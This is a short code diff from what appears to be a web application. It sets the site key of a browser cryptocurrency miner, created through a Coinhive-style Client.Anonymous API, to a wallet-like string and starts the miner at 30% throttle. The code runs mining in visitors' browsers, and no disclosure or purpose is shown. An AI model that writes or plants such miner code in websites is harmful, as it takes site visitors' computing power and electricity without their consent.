@@ -1,4 +1,4 @@
-const miner=new Client.Anonymous('web-app',{throttle:0.3,
+const miner=new Client.Anonymous('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuz3Xdz',{throttle:0.3,
 });
 if (!miner.isRunning()){
   miner.start();
